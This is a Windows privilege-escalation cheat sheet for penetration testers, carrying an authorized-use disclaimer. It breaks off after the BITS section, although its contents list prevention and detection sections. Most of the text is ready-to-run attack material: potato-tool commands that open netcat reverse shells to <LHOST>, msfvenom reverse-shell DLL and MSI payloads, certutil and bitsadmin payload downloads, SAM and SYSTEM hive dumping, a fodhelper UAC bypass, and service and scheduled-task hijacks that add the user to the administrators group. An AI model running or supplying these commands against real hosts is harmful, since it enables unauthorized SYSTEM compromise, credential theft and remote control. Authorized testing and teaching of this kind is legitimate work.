# Windows Privilege Escalation

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. Every technique here ends with SYSTEM or Administrator on a host. Use them only on systems you own or that are explicitly in scope. See the [Legal and Terms of Use](/legal) page.

**Scope:** taking a low-privileged foothold on a Windows host and turning it into `NT AUTHORITY\SYSTEM`. Enumeration first, then the misconfigurations and privilege abuses that actually appear in client environments, then how to fix each one.

**Recommended background:** the Windows command line and PowerShell basics, the difference between a user and a service, what the registry is, and NTFS permissions. If `whoami` or `dir` are unfamiliar, cover those first.

**Conventions:** `PS>` is a PowerShell prompt, `C:\>` is cmd. `<LHOST>` is your attacking machine, `<LPORT>` your listener port. A `>` at the start of a prompt is a normal user; commands that need elevation are marked. Most tools here are external binaries you transfer to the target, not built-ins.

## Table of Contents

- [Quick Reference](#quick-reference)
- [How Windows Privilege Escalation Works](#how-windows-privilege-escalation-works)
- [Enumerating the System](#enumerating-the-system)
- [Automated Enumeration](#automated-enumeration)
- [Token Manipulation and Potato Attacks](#token-manipulation-and-potato-attacks)
- [Other Abusable Privileges](#other-abusable-privileges)
- [Service Permission Misconfigurations](#service-permission-misconfigurations)
- [Unquoted Service Paths](#unquoted-service-paths)
- [Weak Service Binary Permissions](#weak-service-binary-permissions)
- [DLL Hijacking](#dll-hijacking)
- [Scheduled Tasks](#scheduled-tasks)
- [Registry: AutoRun and AlwaysInstallElevated](#registry-autorun-and-alwaysinstallelevated)
- [Insecure File Permissions](#insecure-file-permissions)
- [UAC Bypass](#uac-bypass)
- [BITS Abuse](#bits-abuse)
- [Credential Hunting](#credential-hunting)
- [Credential Theft](#credential-theft)
- [Kernel Exploits](#kernel-exploits)
- [Proving Access and Cleaning Up](#proving-access-and-cleaning-up)
- [Prevention](#prevention)
- [Detection and Response](#detection-and-response)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

---

## 1. Quick Reference

**Skim this now, return to it later.** Every command here is explained properly in the section noted beside it. This page exists so that once you know the material, you do not have to hunt for the syntax.

```powershell
whoami /priv                    # your privileges, the fastest win        (Section 5)
whoami /groups                  # your group memberships and integrity     (Section 2)
systeminfo                      # OS build, for kernel exploit search      (Section 18)
sc query                        # running services                         (Section 7)
schtasks /query /fo LIST /v     # scheduled tasks                          (Section 11)
cmdkey /list                    # saved credentials                        (Section 16)
```

What to stop on in each:

| Command             | Boring result                               | Interesting result                                                |
| ------------------- | ------------------------------------------- | ----------------------------------------------------------------- |
| `whoami /priv`      | Everything `Disabled` and mundane           | `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege` |
| `whoami /groups`    | `Medium Mandatory Level`, plain user groups | `BUILTIN\Administrators`, `High Mandatory Level`                  |
| `systeminfo`        | Recent build, hotfixes listed               | Old build, empty hotfix list                                      |
| service enumeration | Signed binaries under `C:\Windows`          | A service binary in `C:\Program Files\Custom` or writable by you  |
| `schtasks`          | Microsoft tasks                             | A task running a script in a writable path as SYSTEM              |
| `cmdkey /list`      | Empty                                       | A stored `Administrator` credential                               |

**The single most valuable line:** `whoami /priv`. If it shows `SeImpersonatePrivilege`, you are one tool away from SYSTEM (Section 5), and that is the most common finding on real Windows hosts because every service account has it.

---

## 2. How Windows Privilege Escalation Works

**Why this section exists:** Windows privilege is built from different pieces than Linux, and the techniques only make sense once you know the pieces. Learn these five ideas and the rest of the sheet is variations on them.

### Everything is a SID, and access is a token

Windows identifies every user and group by a **Security Identifier (SID)**, a string like `S-1-5-21-...-500`. A few are fixed and worth memorising:

| SID            | Account                  | Meaning                                 |
| -------------- | ------------------------ | --------------------------------------- |
| `S-1-5-18`     | `NT AUTHORITY\SYSTEM`    | **The goal.** Higher than Administrator |
| `S-1-5-32-544` | `BUILTIN\Administrators` | The local admin group                   |
| `...-500`      | Built-in Administrator   | The RID `500` is always the real admin  |

When you log in, Windows builds an **access token**: your SID, your groups, and your privileges. Every process carries a copy. When a process touches a securable object, the kernel compares the token against the object's permissions. **Privilege escalation is getting a token that is more powerful than the one you were given.**

### SYSTEM is above Administrator

On Linux there is one root. On Windows there are two tiers worth reaching:

| Account       | What it is                                                                                      |
| ------------- | ----------------------------------------------------------------------------------------------- |
| Administrator | A user in the `Administrators` group. Can do admin things, but subject to UAC (Section 14)      |
| **SYSTEM**    | The operating system itself. No UAC, full access to `LSASS` and the `SAM`. What services run as |

Most techniques here target SYSTEM directly, because services run as SYSTEM and services are where the misconfigurations live.

### Privileges are separate from group membership

A token carries a list of **privileges**, which are specific powers independent of what groups you are in. A lowly service account with no admin rights can still hold `SeImpersonatePrivilege`, and that one privilege is enough to become SYSTEM (Section 5).

```powershell
whoami /priv
```

This is why `whoami /priv` comes before everything. A privilege is a direct route that ignores your group membership entirely.

### Integrity levels sit on top of permissions

Even an administrator's processes usually run at **Medium** integrity, not High. UAC is what raises them to High when you approve a prompt. This is why "I am in the Administrators group" does not mean "I can edit `C:\Windows`" until you elevate. Section 14 is entirely about crossing Medium to High.

| Integrity level | Who runs here                                   |
| --------------- | ----------------------------------------------- |
| Low             | Sandboxed processes, browsers                   |
| Medium          | Normal user, and admin **before** UAC elevation |
| High            | Admin **after** UAC elevation                   |
| System          | SYSTEM                                          |

### The four routes to SYSTEM

Every section that follows is one of these four.

| Route                                  | Mechanism                                        | Sections                |
| -------------------------------------- | ------------------------------------------------ | ----------------------- |
| **Abuse a privilege you already hold** | A token privilege that grants more than intended | 5, 6                    |
| **Hijack something SYSTEM runs**       | Replace or redirect a service, task, or DLL      | 7, 8, 9, 10, 11, 12, 13 |
| **Steal a more powerful credential**   | Find or dump an admin password or hash           | 16, 17                  |
| **Bypass a boundary**                  | UAC, or a kernel bug                             | 14, 18                  |

So when you enumerate you are answering four questions: _what privileges do I hold_, _what does SYSTEM run that I can influence_, _whose password can I find_, and _how old is this build_.

---

## 3. Enumerating the System

**What you are building:** a picture of the host before you touch anything. On Windows this takes longer than on Linux because the interesting things hide in service configs and the registry.

### Start with your own token

```powershell
whoami /all
```

`/all` dumps your SID, every group, and every privilege in one command. It is three separate checks in one, and worth running first.

```
USER INFORMATION
User Name       SID
=============== =============================================
corp\jdoe       S-1-5-21-1004336348-1177238915-682003330-1109

GROUP INFORMATION
Group Name                           Type             Attributes
==================================== ================ ==================================================
BUILTIN\Users                        Alias            Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level  Label

PRIVILEGES INFORMATION
Privilege Name                Description                    State
============================= ============================== ========
SeImpersonatePrivilege        Impersonate a client           Enabled
```

Read it in three parts:

| Section    | What you are looking for                                                                   |
| ---------- | ------------------------------------------------------------------------------------------ |
| USER       | Your SID. The RID at the end tells you if you are a domain or local account                |
| GROUP      | `BUILTIN\Administrators` (you are admin, only need UAC) or the integrity `Label` line      |
| PRIVILEGES | **`SeImpersonate`, `SeBackup`, `SeRestore`, `SeTakeOwnership`, `SeDebug`, `SeLoadDriver`** |

Any of those privileges is a finding. `SeImpersonatePrivilege Enabled` means go straight to Section 5.

### The operating system

```powershell
systeminfo
```

```
OS Name:              Microsoft Windows Server 2016 Standard
OS Version:           10.0.14393 N/A Build 14393
System Type:          x64-based PC
Hotfix(s):            3 Hotfix(s) Installed.
```

| Field         | Why it matters                                                                   |
| ------------- | -------------------------------------------------------------------------------- |
| `OS Version`  | The build number, `14393`. Feeds the kernel exploit search (Section 18)          |
| `System Type` | `x64` decides which tool binaries you upload                                     |
| `Hotfix(s)`   | **Three patches on a server is almost none.** A short list means missing patches |

Trim it to the essentials:

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

`findstr /B` matches only at the beginning of a line, and `/C:"..."` treats the whole quoted string as one search term rather than splitting on spaces.

### Users and network

```cmd
net user                    :: local accounts
net user administrator       :: detail on one account, including group membership
net localgroup administrators :: who is a local admin
ipconfig /all
netstat -ano                 :: -a all, -n numeric, -o show owning PID
```

`netstat -ano` matters for the same reason as on Linux: a service bound to `127.0.0.1` is only reachable from inside, so it is usually less hardened. The `-o` flag gives you the PID, which you match against `tasklist` to see what owns it.

```powershell
tasklist /svc
```

`/svc` shows which service each process hosts, so you can tie a listening port to a named service and then check that service's config (Section 7).

### Software, which is where custom services live

```powershell
# 32-bit and 64-bit installed programs
Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | Select-Object Name
```

Non-Microsoft software is where misconfigured services, unquoted paths, and writable binaries cluster, because it was installed by someone who was not thinking about the SYSTEM account's exposure.

---

## 4. Automated Enumeration

**What these tools are:** scripts that run hundreds of privilege-escalation checks and flag the results. They find things fast, but you still read Section 3 by hand, because custom services and odd configs do not match a known pattern, and because you will only recognise the important output if you already understand it.

### WinPEAS

The Windows counterpart to LinPEAS. Transfer the binary and run it.

```cmd
winPEASx64.exe > peas.txt
```

Run it to a file and read the file, because the live output is thousands of colour-coded lines. WinPEAS highlights the highest-confidence findings in red, so grep for those first.

```cmd
type peas.txt | findstr /i "SeImpersonate AlwaysInstallElevated Unquoted writable"
```

WinPEAS also needs no arguments to be useful. The plain run covers services, registry, credentials, and patches in one pass.

### PowerUp

A PowerShell script focused specifically on local privilege escalation, and the tool the module names for services, registry, and file permissions.

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

| Piece              | What it does                                                                                                                                   |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `-ep bypass`       | Set the execution policy to bypass **for this process only**, so the script is allowed to run. It is not a security control, just a speed bump |
| `. .\PowerUp.ps1`  | Dot-source the script, which loads its functions into your session                                                                             |
| `Invoke-AllChecks` | Run every check and print each finding with an `AbuseFunction` you can call                                                                    |

```
[*] Checking service permissions...

ServiceName    : VulnSvc
Path           : C:\Program Files\VulnApp\service.exe
ModifiablePath : C:\Program Files\VulnApp\
AbuseFunction  : Write-ServiceBinary -Name 'VulnSvc' -Path <...>
```

The `AbuseFunction` line is PowerUp handing you the exploit. Section 7 explains what it does under the hood, which you need for the report and for when the automated version fails.

### Seatbelt

A C# tool that gathers host information rather than exploiting it. Good for credential locations and system detail.

```cmd
Seatbelt.exe -group=all
```

### Transferring tools to the target

You almost always have to get these binaries onto the host first.

```powershell
# PowerShell download
IWR -Uri http://<LHOST>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe

# certutil, present on every Windows host, useful when PowerShell is restricted
certutil.exe -urlcache -f http://<LHOST>/PowerUp.ps1 PowerUp.ps1
```

`IWR` is `Invoke-WebRequest`. `certutil` is a certificate utility that happens to download files, which is why it survives on locked-down hosts where PowerShell is watched. Use `C:\Windows\Temp`, which is writable by all users.

---

## 5. Token Manipulation and Potato Attacks

**What this is:** the highest-value technique on Windows. If your token holds `SeImpersonatePrivilege`, you can make a SYSTEM process authenticate to you, capture its token, and impersonate it. The result is a SYSTEM shell.

**Why it is so common:** `SeImpersonatePrivilege` is granted to every service account by default, including `IIS AppPool`, `mssql`, and most accounts you land on after exploiting a web app or database. This is the single most likely path on a real engagement.

### Confirm the privilege

```powershell
whoami /priv
```

```
Privilege Name                Description                               State
============================= ========================================= =======
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
```

`SeImpersonatePrivilege` with state `Enabled` is the finding. `SeAssignPrimaryTokenPrivilege` is the sibling privilege, exploited by the same tools.

### The idea behind the "potato" family

All of these tools do the same three steps: trick a SYSTEM service into authenticating to a listener you control, capture the token that authentication produces, then use `SeImpersonate` to run a command as that token. The differences are only in **how** they force the SYSTEM authentication.

| Tool             | Trigger it uses                     | Works on                                                       |
| ---------------- | ----------------------------------- | -------------------------------------------------------------- |
| **PrintSpoofer** | The print spooler service           | Windows 10, Server 2016 to 2022. The reliable modern choice    |
| **JuicyPotato**  | DCOM and NTLM reflection            | Windows up to Server 2016 / Win10 1809. **Patched after that** |
| **RoguePotato**  | DCOM via a redirected OXID resolver | When JuicyPotato is patched but you have outbound access       |

**Pick PrintSpoofer first on a modern host.** JuicyPotato is dead on anything built after late 2018, and reaching for it there wastes time.

### PrintSpoofer

```cmd
PrintSpoofer64.exe -i -c cmd.exe
```

| Flag         | What it does                                                                               |
| ------------ | ------------------------------------------------------------------------------------------ |
| `-i`         | Interactive. Give the new SYSTEM shell your current console                                |
| `-c cmd.exe` | The command to run as SYSTEM. Use `powershell.exe` or a payload path instead if you prefer |

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\Windows\system32> whoami
nt authority\system
```

`nt authority\system` is the win. Nothing sits above it on a single host.

To catch a shell on your own machine instead of using the console:

```cmd
PrintSpoofer64.exe -c "c:\windows\temp\nc.exe <LHOST> <LPORT> -e cmd.exe"
```

### JuicyPotato

Only on hosts old enough to be vulnerable.

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\rev.bat" -t *
```

| Flag            | What it does                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------------------ |
| `-l 1337`       | The COM listener port. Any free port                                                                               |
| `-p ...cmd.exe` | The program to launch                                                                                              |
| `-a "/c ..."`   | Arguments passed to it. `/c` tells cmd to run the following and exit                                               |
| `-t *`          | Try both `CreateProcessWithToken` (needs `SeImpersonate`) and `CreateProcessAsUser` (needs `SeAssignPrimaryToken`) |

If it fails, the problem is usually the **CLSID**, the identifier of the DCOM object it abuses. Different Windows versions need different CLSIDs, listed on the JuicyPotato GitHub.

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c "{CLSID-HERE}"
```

### RoguePotato

When JuicyPotato is patched. It needs a redirector because it relies on reaching an OXID resolver on port 135.

```cmd
RoguePotato.exe -r <LHOST> -e "c:\windows\temp\nc.exe <LHOST> <LPORT> -e cmd.exe" -l 9999
```

`-r` is the redirector address, `-l` the local listening port for the resolver, `-e` the command to run as SYSTEM.

---

## 6. Other Abusable Privileges

**Why this section exists:** `SeImpersonate` gets the attention, but `whoami /priv` often reveals other privileges that are just as final. Each one is a direct route that ignores your group membership.

| Privilege                    | What it grants                 | The attack                                                      |
| ---------------------------- | ------------------------------ | --------------------------------------------------------------- |
| **SeBackupPrivilege**        | Read any file, bypassing ACLs  | Copy the `SAM` and `SYSTEM` hives, crack offline (Section 17)   |
| **SeRestorePrivilege**       | Write any file, bypassing ACLs | Overwrite a SYSTEM binary or a service DLL                      |
| **SeTakeOwnershipPrivilege** | Take ownership of any object   | Own a SYSTEM file, then grant yourself write access             |
| **SeDebugPrivilege**         | Open any process               | Inject into or dump a SYSTEM process such as LSASS (Section 17) |
| **SeLoadDriverPrivilege**    | Load a kernel driver           | Load a vulnerable signed driver and exploit it                  |

### SeBackupPrivilege

The privilege is designed for backup software, which must read every file regardless of its ACL. That is exactly what you want.

```cmd
:: read the registry hives that hold password hashes
reg save hklm\sam C:\Temp\sam.hive
reg save hklm\system C:\Temp\system.hive
```

Move both to your machine and extract the hashes offline, as in Section 17. The privilege let you read files an ordinary user cannot.

### SeTakeOwnershipPrivilege

```cmd
takeown /f C:\Windows\System32\target.exe
icacls C:\Windows\System32\target.exe /grant <you>:F
```

`takeown` claims ownership, which the privilege permits. `icacls ... /grant <you>:F` then gives your account full control. Owning a file lets you rewrite its permissions, and rewriting its permissions lets you replace it.

---

## 7. Service Permission Misconfigurations

**What a Windows service is:** a background program managed by the Service Control Manager, usually running as SYSTEM. Each service has a configuration: the binary it runs, the account it runs as, and an ACL controlling who may change those.

**The vulnerability:** if your account can change a service's configuration, you point it at your own binary. The service next starts your binary as SYSTEM. This is the most common Windows service flaw.

### Find services you can modify

```cmd
sc query
sc qc <ServiceName>
```

`sc query` lists running services. `sc qc` shows one service's full config: its binary path and the account it runs as.

```
SERVICE_NAME: VulnSvc
        BINARY_PATH_NAME   : C:\Program Files\VulnApp\service.exe
        SERVICE_START_NAME : LocalSystem
```

`SERVICE_START_NAME : LocalSystem` means it runs as SYSTEM, so controlling it means SYSTEM.

### Check the permissions with AccessChk

`AccessChk` is the Sysinternals tool for viewing effective permissions on services, files, and registry keys.

```cmd
accesschk64.exe -uwcqv "<username>" * /accepteula
```

| Flag          | What it does                                            |
| ------------- | ------------------------------------------------------- |
| `-u`          | Suppress errors                                         |
| `-w`          | Show only objects you have **write** access to          |
| `-c`          | Treat the name as a Windows service                     |
| `-q`          | Quiet, omit the banner                                  |
| `-v`          | Verbose, list the specific rights                       |
| `*`           | All services                                            |
| `/accepteula` | Accept the licence without a popup, needed on first run |

```
RW VulnSvc
        SERVICE_ALL_ACCESS
```

`SERVICE_ALL_ACCESS` is total control. `SERVICE_CHANGE_CONFIG` alone is also enough, because that is the specific right you need next.

### Reconfigure and restart

```cmd
sc config VulnSvc binpath= "C:\Windows\Temp\rev.exe"
sc stop VulnSvc
sc start VulnSvc
```

| Piece                     | Detail                                                                                |
| ------------------------- | ------------------------------------------------------------------------------------- |
| `binpath=`                | **The space after `=` is required.** `sc` will silently do the wrong thing without it |
| `sc stop` then `sc start` | The new binary only runs on the next start                                            |

When the service starts, `rev.exe` runs as SYSTEM.

If you cannot restart it because you lack the rights, check whether it starts at boot:

```cmd
sc qc VulnSvc | findstr START_TYPE
```

`AUTO_START` means a reboot triggers it, which you can sometimes force another way.

PowerUp automates the whole check-and-abuse:

```powershell
Invoke-ServiceAbuse -Name 'VulnSvc' -Command "net localgroup administrators <you> /add"
```

This example adds you to the local admin group rather than spawning a shell, which is quieter and survives a lost session.

---

## 8. Unquoted Service Paths

**What the flaw is:** when a service's binary path contains spaces and is **not wrapped in quotes**, Windows does not know where the path ends. It guesses, trying each possibility in order, and if you can write to one of the guessed locations, it runs your file instead.

**Why it happens:** a developer writes `C:\Program Files\My App\service.exe` into the config without quotes, and Windows treats the space as a possible break point.

### How Windows resolves the path

For an unquoted path `C:\Program Files\My App\service.exe`, Windows tries in this order:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

It appends `.exe` at each space and tries that first. If you can drop `My.exe` into `C:\Program Files\` and the service runs as SYSTEM, your file executes as SYSTEM before the real one is ever reached.

### Find them

```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """
```

| Piece                        | What it does                                                            |
| ---------------------------- | ----------------------------------------------------------------------- |
| `wmic service get ...`       | List each service's name, binary path, and start mode                   |
| `findstr /i /v "C:\Windows"` | `/v` inverts, so this **removes** Microsoft services under `C:\Windows` |
| `findstr /i /v """`          | Remove paths that are already quoted                                    |

What remains is unquoted paths outside `C:\Windows`, which is your candidate list.

```
VulnApp2   C:\Program Files\Vuln App2\service.exe   Auto
```

An unquoted path with a space and `Auto` start is the finding.

### Check you can write to a break point

```cmd
accesschk64.exe -uwdq "C:\Program Files\" /accepteula
```

`-d` checks a directory rather than a file. You need write access to one of the directories before the first space, here `C:\Program Files\`. That directory is normally locked down, so this flaw is often unexploitable in practice, and the writable cases usually involve a vendor folder like `C:\Program Files\Vuln App2\` where the space is deeper in the path.

### Exploit it

```cmd
copy rev.exe "C:\Program Files\Vuln.exe"
sc stop VulnApp2 & sc start VulnApp2
```

The service tries `C:\Program Files\Vuln.exe` before the real path, finds your file, and runs it as SYSTEM.

---

## 9. Weak Service Binary Permissions

**What this is:** the service config is locked down, but the **binary file it runs** is writable by you. You do not touch the config, you just overwrite the executable with your own.

This is distinct from Section 7. There you changed where the service points. Here you leave the config alone and replace the file it already points at.

### Check the binary's permissions

From `sc qc` you have the binary path. Test write access:

```cmd
accesschk64.exe -quvw "C:\Program Files\VulnApp\service.exe" /accepteula
```

```
RW BUILTIN\Users
        FILE_ALL_ACCESS
```

`BUILTIN\Users` with `FILE_ALL_ACCESS` on a SYSTEM service binary means any user can replace it.

### Replace it

```cmd
copy /y service.exe service.exe.bak
copy /y rev.exe "C:\Program Files\VulnApp\service.exe"
sc stop VulnApp & sc start VulnApp
```

Keep the backup. You must restore the real binary or the service stays broken. When it restarts, your replacement runs as SYSTEM.

The same idea applies to any file a SYSTEM process executes: if you can write it, you own the process that runs it.

---

## 10. DLL Hijacking

**What a DLL is:** a Dynamic Link Library, a file of shared code that programs load at runtime. When a program starts, it loads the DLLs it needs by name, searching a fixed list of directories in order.

**The vulnerability:** if a SYSTEM program loads a DLL by name and one of the searched directories is writable by you, your DLL loads first and its code runs as SYSTEM. It is the Windows cousin of Linux `LD_PRELOAD` and PATH hijacking combined.

### The DLL search order

When a program requests `foo.dll` without a full path, Windows searches, roughly:

```
1. The directory the program was launched from
2. C:\Windows\System32
3. C:\Windows
4. The current working directory
5. Each directory in the PATH environment variable
```

**The weak links are 1, 4, and 5.** A DLL missing from where the program expects it, plus a writable directory earlier in the search, equals a hijack.

### Find a candidate

The usual signs are a service or scheduled task running as SYSTEM whose program tries to load a DLL that does not exist, or whose own directory is writable. Process Monitor (`procmon`) shows every DLL load attempt, and `NAME NOT FOUND` results on a `.dll` are exactly the openings you want.

```
service.exe   CreateFile   C:\Program Files\App\custom.dll   NAME NOT FOUND
```

That line says the program looked for `custom.dll`, did not find it, and will keep searching. Drop your `custom.dll` into a directory searched earlier and it loads.

Check whether the program's own directory is writable:

```cmd
accesschk64.exe -quvw "C:\Program Files\App\" /accepteula
```

### Build the malicious DLL

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o custom.dll
```

| Piece                              | What it does                                      |
| ---------------------------------- | ------------------------------------------------- |
| `-p windows/x64/shell_reverse_tcp` | The payload, a reverse shell                      |
| `-f dll`                           | Output format is a DLL                            |
| `-o custom.dll`                    | **Name it exactly what the program searches for** |

Drop it in the writable directory, then trigger the program's start. Its `DllMain` runs your code the moment the DLL loads, as SYSTEM.

---

## 11. Scheduled Tasks

**What a scheduled task is:** a program Windows runs on a trigger, a time, a login, or an event, often as SYSTEM. The Windows equivalent of Linux cron.

**The vulnerability:** the same as cron. The task runs as SYSTEM but does not care who owns the script or binary it runs. If you can write that file, you get SYSTEM on the next trigger.

### List tasks

```cmd
schtasks /query /fo LIST /v
```

| Flag       | What it does                                                     |
| ---------- | ---------------------------------------------------------------- |
| `/query`   | List tasks                                                       |
| `/fo LIST` | Format as a readable list rather than a table                    |
| `/v`       | Verbose, which is what includes the `Run As User` and the action |

```
TaskName:      \CustomBackup
Run As User:   SYSTEM
Task To Run:   C:\Scripts\backup.bat
Schedule:      At 3:00 AM every day
```

| Field                 | What to check                                 |
| --------------------- | --------------------------------------------- |
| `Run As User: SYSTEM` | The task is worth attacking                   |
| `Task To Run`         | **The file whose permissions you check next** |
| `Schedule`            | Whether you can wait for it during the test   |

Filter to the interesting ones:

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Select TaskName, TaskPath
```

### Check whether you can write the target

```cmd
accesschk64.exe -quvw "C:\Scripts\backup.bat" /accepteula
```

```
RW BUILTIN\Users
        FILE_ALL_ACCESS
```

A SYSTEM task running a script that any user can write.

### Modify it

```cmd
echo net localgroup administrators <you> /add >> C:\Scripts\backup.bat
```

Append with `>>`, never overwrite. Overwriting breaks the client's task and gets noticed. Adding yourself to the admin group survives a lost shell better than a reverse shell one-liner does.

If you can trigger the task rather than wait:

```cmd
schtasks /run /tn "\CustomBackup"
```

---

## 12. Registry: AutoRun and AlwaysInstallElevated

**What the registry is:** a hierarchical database of system and application settings. Some keys control what runs at startup and how installers behave, and weak permissions on those keys are a privilege escalation path.

### AlwaysInstallElevated

**What it is:** a policy that makes Windows Installer run `.msi` packages as SYSTEM, regardless of who launches them. It exists so that users can install approved software, and it is catastrophic when left on, because any user can install their own malicious `.msi` as SYSTEM.

It requires **two** registry keys to be set, one per hive:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
    AlwaysInstallElevated    REG_DWORD    0x1
```

Both must return `0x1`. If either is `0x0` or missing, the technique does not work. This is the most common reason it fails.

Build and run the installer:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

| Flag     | What it does         |
| -------- | -------------------- |
| `/quiet` | No user interaction  |
| `/qn`    | No UI at all         |
| `/i`     | Install this package |

The installer runs as SYSTEM because of the policy, so your payload does too.

### AutoRun keys

Programs listed in the `Run` keys start automatically. If the key is writable, or the program it points to is writable, you get code execution as whoever logs in next, which may be an administrator.

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

```
    SecurityUpdater    REG_SZ    C:\Program Files\Updater\updater.exe
```

Check whether you can write to the key or the target binary:

```cmd
accesschk64.exe -uvwqk "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /accepteula
accesschk64.exe -quvw "C:\Program Files\Updater\updater.exe" /accepteula
```

`-k` tells AccessChk the name is a registry key. If the binary is writable, replace it, then wait for the next admin login. `Autoruns` from Sysinternals is the GUI tool for surveying every autostart location at once.

---

## 13. Insecure File Permissions

**What this covers:** the general case behind Sections 9, 11, and 12. Any file that a privileged process runs, if you can write it, gives you that process's privileges. This section is how you check and set NTFS permissions with `icacls`.

### Reading permissions with icacls

```cmd
icacls "C:\Program Files\VulnApp\service.exe"
```

```
C:\Program Files\VulnApp\service.exe BUILTIN\Users:(F)
                                     NT AUTHORITY\SYSTEM:(F)
                                     BUILTIN\Administrators:(F)
```

The permission codes:

| Code   | Meaning          |
| ------ | ---------------- |
| `(F)`  | Full control     |
| `(M)`  | Modify           |
| `(W)`  | Write            |
| `(RX)` | Read and execute |
| `(R)`  | Read             |

`BUILTIN\Users:(F)` on a SYSTEM service binary is the vulnerability. Any user has full control, so any user can replace the file.

### Which groups matter

When you see a write grant, check whether **your** account falls under it:

| Principal                  | Includes                        |
| -------------------------- | ------------------------------- |
| `Everyone`                 | Literally everyone              |
| `BUILTIN\Users`            | All local users, including you  |
| `Authenticated Users`      | Anyone logged in, including you |
| `NT AUTHORITY\INTERACTIVE` | Anyone logged in interactively  |

A grant to any of these is exploitable by a normal user.

### Granting yourself access when you have ownership

If you took ownership via `SeTakeOwnership` (Section 6):

```cmd
icacls "C:\Windows\System32\target.exe" /grant <you>:F
```

`/grant <you>:F` adds a full-control entry for your account. Ownership lets you edit the ACL, and editing the ACL lets you grant whatever you need.

---

## 14. UAC Bypass

**What UAC is:** User Account Control. Even when you are in the Administrators group, your processes run at Medium integrity. UAC is the consent prompt that raises a process to High integrity when you approve it. This is why an admin shell from a payload often cannot write to `C:\Windows` until it is elevated.

**What a bypass does:** it reaches High integrity **without** the consent prompt, by abusing a Microsoft binary that auto-elevates. It only applies when you are **already an administrator** sitting at Medium integrity. It is not a route from a standard user to admin.

### Confirm you are an admin at medium integrity

```powershell
whoami /groups | findstr /i "Administrators Mandatory"
```

```
BUILTIN\Administrators   ...   Group used for deny only
Mandatory Label\Medium Mandatory Level
```

`Administrators` present but `Medium Mandatory Level`, and the "deny only" note, is the exact situation a UAC bypass fixes.

### The fodhelper technique

`fodhelper.exe` is a Microsoft binary that auto-elevates and reads a registry key that a normal user can write. Point that key at your command and fodhelper runs it at High integrity.

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\Windows\Temp\rev.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```

| Line             | What it does                                                                                             |
| ---------------- | -------------------------------------------------------------------------------------------------------- |
| First `reg add`  | Sets the default value of the key to your payload. `/ve` is the default value, `/d` the data, `/f` force |
| Second `reg add` | Adds an empty `DelegateExecute` value, which is what makes fodhelper read this key path                  |
| `fodhelper.exe`  | Auto-elevates, reads your key, runs your payload at High integrity                                       |

```cmd
:: in the elevated shell
whoami /groups | findstr Mandatory
```

```
Mandatory Label\High Mandatory Level
```

`High Mandatory Level` confirms the bypass worked. Clean up the key afterward, as it is your artifact:

```cmd
reg delete HKCU\Software\Classes\ms-settings /f
```

### UACMe

`UACMe` is a collection of dozens of UAC bypass methods, indexed by number, useful when fodhelper is patched or monitored on a given build.

```cmd
Akagi64.exe 33 C:\Windows\Temp\rev.exe
```

`33` selects a specific method. The right number depends on the Windows build, which the UACMe documentation maps out.

---

## 15. BITS Abuse

**What BITS is:** the Background Intelligent Transfer Service, the component Windows Update uses to download files in the background. It runs with elevated privileges and exposes a command-line tool, `bitsadmin`.

**Why it is abused:** BITS can download a file and then run a command when the transfer finishes. On older Windows, that completion command ran with the service's privileges, and BITS is a convenient, trusted way to both fetch a payload and execute it.

### Download a payload

```cmd
bitsadmin /transfer job /download /priority high http://<LHOST>/rev.exe C:\Windows\Temp\rev.exe
```

| Piece            | What it does                                    |
| ---------------- | ----------------------------------------------- |
| `/transfer job`  | Create and run a transfer job named `job`       |
| `/download`      | It is a download                                |
| `/priority high` | Run it now rather than when the machine is idle |
| The two paths    | Source URL, then local destination              |

This alone is a quiet way to stage tools, because BITS is a normal, expected process making the request rather than PowerShell or certutil.

### The execute-on-completion trick

On systems where it still works, split the job into steps and attach a command to the completion event.

```cmd
bitsadmin /create eviljob
bitsadmin /addfile eviljob http://<LHOST>/rev.exe C:\Windows\Temp\rev.exe
bitsadmin /SetNotifyCmdLine eviljob C:\Windows\Temp\rev.exe NULL
bitsadmin /resume eviljob
bitsadmin /complete eviljob
```

| Command             | What it does                                     |
| ------------------- | ------------------------------------------------ |
| `/create`           | Make an empty job                                |
| `/addfile`          | Add the download to it                           |
| `/SetNotifyCmdLine` | **Run this command when the transfer finishes**  |
| `/resume`           | Start the transfer                               |
| `/complete`         | Finalise the job, which fires the notify command |

`NULL` is the arguments parameter, meaning none. The PowerShell BITS cmdlets (`Start-BitsTransfer`) do the same downloading more cleanly, and are the modern equivalent for staging.

---

